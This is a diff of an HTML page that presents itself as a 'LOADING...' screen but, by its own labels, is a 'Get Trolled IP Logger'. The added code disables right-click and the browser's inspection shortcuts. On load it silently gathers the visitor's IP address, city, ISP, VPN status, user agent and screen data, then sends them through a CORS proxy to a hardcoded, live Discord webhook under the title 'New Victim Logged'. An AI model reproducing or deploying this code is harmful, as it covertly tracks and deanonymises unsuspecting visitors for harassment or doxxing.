@@ -3,186 +3,128 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Get Trolled</title>
+<title>Loading...</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
 
-  /* Reset */
-  * {
-    margin: 0; padding: 0; box-sizing: border-box;
-  }
-
   html, body {
-    height: 100%;
-    font-family: 'Orbitron', sans-serif;
+    margin: 0; padding: 0; height: 100%;
     background: black;
-    color: #0ff;
-    overflow: hidden;
-  }
-
-  #video-container {
-    position: fixed;
-    top:0; left:0; width: 100%; height: 100%;
-    z-index: 0;
-    overflow: hidden;
-  }
-
-  #plank-video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    filter: brightness(0.2) saturate(1.1);
-  }
-
-  #loading-screen {
-    position: fixed;
-    top:0; left:0; width:100%; height:100%;
-    background: black;
+    color: #00ffff;
+    font-family: 'Orbitron', monospace;
     display: flex;
     justify-content: center;
     align-items: center;
-    z-index: 20;
     user-select: none;
-    flex-direction: column;
   }
 
   #loading-text {
-    font-size: 4rem;
-    color: #0ff;
-    animation: fadeLoading 3s infinite;
+    font-size: 5rem;
+    animation: gtaFlicker 2.5s infinite alternate;
     letter-spacing: 0.2em;
   }
 
-  @keyframes fadeLoading {
-    0%, 100% {opacity: 1;}
-    50% {opacity: 0.3;}
+  @keyframes gtaFlicker {
+    0%, 100% { opacity: 1; }
+    40%, 60% { opacity: 0.3; }
   }
 
-  #final-message {
-    position: fixed;
-    top: 10vh;
-    width: 100%;
-    text-align: center;
-    font-size: 3rem;
-    color: #0ff;
-    z-index: 10;
+  /* Disable text selection and right-click */
+  body, html {
+    -webkit-user-select: none;
+    -moz-user-select: none;
     user-select: none;
-    opacity: 0;
-    transition: opacity 1s ease-in-out;
   }
 </style>
 </head>
 <body>
 
-<div id="video-container">
-  <video id="plank-video" autoplay loop muted playsinline>
-    <source src="https://media.discordapp.net/attachments/1130971768459382884/1133882111988875304/Phonk_trollge_meme_original_hke8wCNNosI.mp4" type="video/mp4" />
-    Your browser does not support the video tag.
-  </video>
-</div>
-
-<div id="loading-screen" role="alert" aria-live="assertive">
-  <div id="loading-text">LOADING...</div>
-</div>
-
-<div id="final-message" aria-live="polite" aria-atomic="true">
-  Welcome
-</div>
+<div id="loading-text">LOADING...</div>
 
 <script>
-  const corsProxy = "https://cors-anywhere.herokuapp.com/";
-  const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
+  // Disable right-click context menu
+  document.addEventListener('contextmenu', e => e.preventDefault());
 
-  async function fetchIPv4() {
-    const res = await fetch('https://api.ipify.org?format=json');
-    if (!res.ok) throw new Error('IPv4 fetch failed');
-    const data = await res.json();
-    return data.ip;
-  }
-
-  async function fetchIPv6() {
-    try {
-      const res = await fetch('https://api6.ipify.org?format=json');
-      if (!res.ok) return null;
-      const data = await res.json();
-      return data.ip;
-    } catch {
-      return null;
+  // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C etc
+  document.addEventListener('keydown', e => {
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && ['I', 'C'].includes(e.key.toUpperCase())) ||
+      (e.ctrlKey && e.key.toUpperCase() === 'U')
+    ) {
+      e.preventDefault();
     }
+  });
+
+  // Fetch geo + VPN data + IP from ipwhois.app (free, no key needed)
+  // Docs: https://ipwhois.io/documentation
+
+  const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
+  const corsProxy = "https://cors-anywhere.herokuapp.com/";
+
+  async function fetchIPInfo() {
+    const res = await fetch('https://ipwhois.app/json/');
+    if(!res.ok) throw new Error("Failed to get IP info");
+    const data = await res.json();
+    return data;
   }
 
-  async function sendWebhookEmbed(ipv4, ipv6, ua, screenInfo, timezone) {
+  async function sendDiscordWebhook(data) {
+    // Compose embed with rich details
     const embed = {
-      title: "🕵️‍♂️ New Victim IP Logged",
+      title: "🕵️‍♂️ New Victim Logged",
       color: 0x00ffff,
       timestamp: new Date().toISOString(),
       footer: {
         text: "Get Trolled IP Grabber",
-        icon_url: "https://i.imgur.com/qZ7j0fV.png" // example icon, replace if you want
+        icon_url: "https://i.imgur.com/qZ7j0fV.png"
       },
-      fields: [
-        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
-        ...(ipv6 ? [{ name: "IPv6 Address", value: `\`${ipv6}\``, inline: true }] : []),
-        { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false },
-        { name: "Screen Resolution", value: `\`${screenInfo}\``, inline: true },
-        { name: "Timezone", value: `\`${timezone}\``, inline: true }
-      ],
       thumbnail: {
-        url: "https://i.imgur.com/CeTvnKq.png" // some troll icon or custom image
+        url: data.country_flag || ""
       },
       author: {
-        name: "Get Trolled IP Grabber",
+        name: "Get Trolled IP Logger",
         url: "https://discord.com",
         icon_url: "https://i.imgur.com/qZ7j0fV.png"
-      }
+      },
+      fields: [
+        { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
+        { name: "IPv6 Address", value: `\`N/A\``, inline: true },
+        { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
+        { name: "Region", value: `${data.region}`, inline: true },
+        { name: "City", value: `${data.city}`, inline: true },
+        { name: "ISP", value: `${data.isp}`, inline: false },
+        { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
+        { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
+        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
+      ]
     };
 
     try {
       const res = await fetch(corsProxy + webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify({ embeds: [embed] })
       });
-      if (!res.ok) throw new Error(`Webhook error ${res.status}`);
+      if(!res.ok) throw new Error("Discord webhook error " + res.status);
       return true;
     } catch (e) {
-      console.error("Webhook sending failed:", e);
+      console.error("Webhook send failed:", e);
       return false;
     }
   }
 
-  async function main() {
-    const loadingScreen = document.getElementById("loading-screen");
-    const finalMessage = document.getElementById("final-message");
-
+  // Run on load
+  (async function(){
     try {
-      // fetch data
-      const ipv4 = await fetchIPv4();
-      const ipv6 = await fetchIPv6();
-      const ua = navigator.userAgent;
-      const screenInfo = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)`;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-      // send webhook embed
-      await sendWebhookEmbed(ipv4, ipv6, ua, screenInfo, timezone);
-
-      // fade out loading, fade in final message
-      loadingScreen.style.transition = "opacity 1.5s ease";
-      loadingScreen.style.opacity = 0;
-      setTimeout(() => loadingScreen.style.display = "none", 1500);
-
-      finalMessage.style.opacity = 1;
-
-    } catch (err) {
-      // fail silently, just hide loading and show final message anyway
-      loadingScreen.style.opacity = 0;
-      setTimeout(() => loadingScreen.style.display = "none", 1500);
-      finalMessage.style.opacity = 1;
-      console.error(err);
+      const data = await fetchIPInfo();
+      await sendDiscordWebhook(data);
+      // Done silently, no page changes
+    } catch(e){
+      console.error(e);
     }
-  }
-
-  main();
+  })();
 </script>
 
 </body>
